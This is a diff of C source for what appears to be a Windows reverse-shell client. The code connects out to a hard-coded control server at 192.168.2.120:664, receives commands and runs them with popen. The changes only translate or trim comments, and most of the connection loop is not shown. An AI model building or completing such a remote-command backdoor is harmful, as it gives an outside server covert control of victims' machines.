@@ -4,7 +4,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
-// simple function that returns the output file returned from executing `cmd` in the shell
+// shell de cmd ile dondurulen cikti
 FILE *execcmd(char *cmd)
 {
     FILE *fp = popen(cmd, "r");
@@ -18,30 +18,30 @@ int s_send(s, msg)
 
 int main(int argc , char *argv[])
 {
-    // simple constants that hold the port and address on which the control server is listening
+   
     const char HOST[20] = "192.168.2.120";
     const int PORT = 664;
 
-    // variables for our socket
+    //our socket
     WSADATA wsa;
     SOCKET s;
 
-    // `sockaddr_in` is a struct that stores information about our control server
+    // `sockaddr_in` kontrol sunucu hakkinda bilgi toplar
     struct sockaddr_in server;
 
     int recv_size;
 
-    // stuff for the command we will receive
+    // alacagim komut için
     const int CMD_SIZE = 2048;
     char cmd[CMD_SIZE];
 
-    // the outputted file from the shell
+    // output file from the shell
     FILE *out_fp = NULL;
 
     // one line of the shell output
     char out[CMD_SIZE];
 
-    // get Winsock ready for use; you don't need to understand this
+    // get Winsock ready for use
     printf("\nInitializing Winsock...");
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
@@ -85,7 +85,7 @@ int main(int argc , char *argv[])
                 return 1;
             }
         } else {
-            // add a NULL terminating character to the end of `cmd` buffer to make it a proper string (won’t print properly without it)
+            // cmd karakterinin  sonuna NULL eklendi,sorunsuz calisma icin
             cmd[recv_size] = '\0';
 
           //  puts(cmd);
